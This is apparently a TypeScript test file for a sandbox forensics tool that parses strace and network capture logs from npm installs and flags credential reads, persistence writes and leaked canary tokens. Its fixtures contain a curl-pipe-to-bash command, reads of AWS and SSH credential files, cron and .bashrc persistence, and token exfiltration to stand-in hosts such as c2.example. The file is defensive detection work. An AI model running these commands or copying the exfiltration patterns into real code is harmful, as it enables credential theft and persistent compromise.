import { test } from "node:test";
import assert from "node:assert/strict";
import { gzipSync } from "node:zlib";
import {
  canaryEnvFile,
  canaryMatcher,
  canaryPatternsFile,
  canaryVariants,
  makeCanaries,
  parseCapture,
  recordCanaryHits,
  summarizeCapture,
  CANARY_NAMES,
} from "../../lib/engine/forensics/capture.ts";
import { DECOY_PATHS, parseStrace, straceCalls } from "../../lib/engine/forensics/strace.ts";
import { deriveBehaviour } from "../../lib/engine/score.ts";

const fixedRandom = (n: number) => Uint8Array.from({ length: n }, (_, i) => (i * 37 + 11) % 256);

test("strace: execve with ppid from clone, unfinished/resumed joins, failed execs skipped", () => {
  const text = [
    `100 1700000000.000001 execve("/usr/bin/env", ["env", "-i", "HOME=/home/cr", "bash", "-c", "npm install"], 0x7ffd /* 3 vars */) = 0`,
    `100 1700000000.000100 execve("/usr/local/sbin/bash", ["bash", "-c", "npm install"], 0x55 /* 30 vars */) = -1 ENOENT (No such file or directory)`,
    `100 1700000000.000200 execve("/usr/bin/bash", ["bash", "-c", "npm install"], 0x55 /* 30 vars */) = 0`,
    `100 1700000000.000300 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD <unfinished ...>`,
    `101 1700000000.000400 chdir("node_modules/evil") = 0`,
    `100 1700000000.000500 <... clone resumed>, child_tidptr=0x7f00) = 101`,
    `101 1700000000.000600 execve("/bin/sh", ["sh", "-c", "curl -s https://x.example/p | bash"], 0x55 /* 30 vars */) = 0`,
    `101 1700000000.000700 openat(AT_FDCWD, "../../../../home/cr/.bashrc", O_WRONLY|O_CREAT|O_APPEND, 0644) = 3`,
    `101 1700000000.000800 openat(AT_FDCWD, "/home/cr/.aws/credentials", O_RDONLY|O_CLOEXEC) = 4`,
    `101 1700000000.000900 openat(AT_FDCWD, "/home/cr/.ssh/id_rsa", O_RDONLY) = -1 EACCES (Permission denied)`,
    `101 1700000000.001000 openat(AT_FDCWD, "/work/app/node_modules/evil/out.js", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 5`,
    `101 1700000000.001100 openat(AT_FDCWD, "/tmp/x", O_WRONLY|O_CREAT, 0600) = 6`,
    `101 1700000000.001200 renameat2(AT_FDCWD, "/tmp/x", AT_FDCWD, "/etc/cron.d/evil", 0) = 0`,
    `101 1700000000.001300 unlinkat(AT_FDCWD, "/home/cr/.npmrc", 0) = 0`,
    `101 1700000000.001400 fchmodat(AT_FDCWD, "/home/cr/.local/bin/run", 0755) = 0`,
    `101 1700000000.001500 openat(AT_FDCWD, "/home/cr/.bashrc", O_WRONLY|O_CREAT|O_APPEND, 0644) = 3`,
    `101 1700000000.001600 +++ exited with 0 +++`,
    `100 1700000000.001700 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=101} ---`,
    `garbage line`,
  ].join("\n");
  const p = parseStrace(text, { phase: "install", initialCwd: "/work/app" });
  assert.deepEqual(
    p.processes.map((x) => [x.pid, x.ppid, x.argv.join(" ")]),
    [
      [100, 0, "env -i HOME=/home/cr bash -c npm install"],
      [100, 0, "bash -c npm install"],
      [101, 100, "sh -c curl -s https://x.example/p | bash"],
    ],
  );
  assert.deepEqual(
    p.files.map((f) => [f.op, f.path, f.pid]),
    [
      ["create", "/home/cr/.bashrc", 101],
      ["read_decoy", "/home/cr/.aws/credentials", 101],
      ["rename", "/etc/cron.d/evil", 101],
      ["unlink", "/home/cr/.npmrc", 101],
      ["chmod", "/home/cr/.local/bin/run", 101],
    ],
  );
  assert.equal(p.stats.unparsed, 1);
  const b = deriveBehaviour({ forgedCalls: [], files: p.files, processes: p.processes, canaryInFiles: [] });
  assert.deepEqual(b.decoyReads, ["/home/cr/.aws/credentials"]);
  assert.deepEqual(b.persistenceWrites, ["/etc/cron.d/evil", "/home/cr/.bashrc"]);
});

test("strace: C escapes, truncated strings and long argv are handled", () => {
  const long = "a".repeat(600);
  const text = [
    `7 1.000000 execve("/usr/bin/node", ["node", "-e", "console.log(\\"hi\\\\n\\")\\x41\\101"...], 0x1 /* 2 vars */) = 0`,
    `8 1.100000 execve("/usr/bin/node", ["node", "${long}", ...], 0x1 /* 2 vars */) = 0`,
  ].join("\n");
  const p = parseStrace(text, { phase: "entry", initialCwd: "/work/src" });
  assert.deepEqual(p.processes[0]!.argv, ["node", "-e", 'console.log("hi\\n")AA']);
  assert.equal(p.processes[1]!.argv.join("").length, 512);
  assert.equal(p.processes[0]!.phase, "entry");
});

test("strace: resumed without a head is counted, never invented", () => {
  const stats = { lines: 0, unparsed: 0, droppedProcesses: 0, droppedFiles: 0 };
  const calls = [...straceCalls(`5 1.0 <... openat resumed>) = 3\n`, stats)];
  assert.equal(calls.length, 0);
  assert.equal(stats.unparsed, 1);
});

test("decoy paths match the harness layout", () => {
  assert.ok(DECOY_PATHS.includes("/home/cr/.aws/credentials"));
  assert.equal(DECOY_PATHS.length, 6);
});

test("canaries: realistic shapes, unique per run, env and pattern files", () => {
  const a = makeCanaries();
  const b = makeCanaries();
  assert.notEqual(a.AWS_SECRET_ACCESS_KEY, b.AWS_SECRET_ACCESS_KEY);
  assert.match(a.AWS_ACCESS_KEY_ID, /^AKIA[A-Z2-7]{16}$/);
  assert.match(a.GITHUB_TOKEN, /^ghp_[A-Za-z0-9]{36}$/);
  assert.match(a.NPM_TOKEN, /^npm_[A-Za-z0-9]{36}$/);
  for (const k of CANARY_NAMES) assert.match(a[k], /^[A-Za-z0-9/+_-]+$/, "harness accepts the value");
  const env = canaryEnvFile(a);
  assert.equal(env.trim().split("\n").length, 5);
  assert.ok(env.includes(`AWS_SECRET_ACCESS_KEY=${a.AWS_SECRET_ACCESS_KEY}`));
  const patterns = canaryPatternsFile(a).trim().split("\n");
  assert.ok(patterns.includes(Buffer.from(a.NPM_TOKEN).toString("base64")));
  assert.ok(canaryVariants("short").length === 0, "variants under 16 chars are never searched");
});

test("capture: parse, phase filter, canary hits in path, headers, base64 and gzip bodies", () => {
  const c = makeCanaries(fixedRandom);
  const m = canaryMatcher(c);
  const rec = (over: Record<string, unknown>) => JSON.stringify({ t: 1, phase: "install", proto: "https", host: "c2.example", port: 443, method: "POST", path: "/x", sni: "c2.example", req_headers: {}, req_bytes: 0, req_body_b64: "", forged_kind: "json", tls: "intercepted", ...over });
  const gz = gzipSync(Buffer.from(`token=${c.GITHUB_TOKEN}`)).toString("base64");
  const text = [
    rec({ path: `/q?k=${encodeURIComponent(c.AWS_SECRET_ACCESS_KEY)}` }),
    rec({ host: "h2.example", req_headers: { Authorization: `Bearer ${Buffer.from(c.NPM_TOKEN).toString("base64")}` } }),
    rec({ host: "h3.example", req_body_b64: gz }),
    rec({ host: "registry.npmjs.org", forged_kind: "mirror", proto: "https", method: "GET", path: "/left-pad" }),
    rec({ host: "probe.cr-fixture.invalid", phase: "probe" }),
    rec({ host: `${Buffer.from(c.OPENAI_API_KEY).toString("hex").slice(0, 60)}.t.example`, proto: "dns", port: 53, method: "A", forged_kind: "dns", tls: null }),
    rec({ host: "evil.example", forged_kind: "tls_refused", tls: "refused", proto: "tcp" }),
    rec({ host: "registry.npmjs.org", integrity: "mismatch", forged_kind: "registry", path: "/x/-/x-1.tgz" }),
    "{not json",
    JSON.stringify({ host: 1 }),
  ].join("\n");
  const parsed = parseCapture(text);
  assert.equal(parsed.records.length, 8);
  assert.equal(parsed.invalid, 2);
  const s = summarizeCapture(parsed.records, m);
  assert.equal(s.harnessRecords, 1);
  assert.equal(s.forgedCalls.length, 7);
  assert.deepEqual(s.forgedCalls[0]!.canary_hits, ["AWS_SECRET_ACCESS_KEY"]);
  assert.deepEqual(s.forgedCalls[1]!.canary_hits, ["NPM_TOKEN"]);
  assert.deepEqual(s.forgedCalls[2]!.canary_hits, ["GITHUB_TOKEN"]);
  assert.deepEqual(s.forgedCalls[3]!.canary_hits, []);
  assert.deepEqual(s.integrityMismatches, [{ host: "registry.npmjs.org", path: "/x/-/x-1.tgz" }]);
  assert.deepEqual(recordCanaryHits(parsed.records[5]!, m), [], "a 60-char hex prefix of the key is not a full canary");
  const b = deriveBehaviour({ forgedCalls: s.forgedCalls, files: [], processes: [], canaryInFiles: [] });
  assert.equal(b.canaryHits.length, 3);
  // Registry records (mirror, registry, and a refused mismatching blob) are never behaviour.
  assert.deepEqual(b.nonDistributionHosts, ["c2.example", "evil.example", "h2.example", "h3.example"]);
  assert.deepEqual(b.tlsRefused, ["evil.example"]);
});
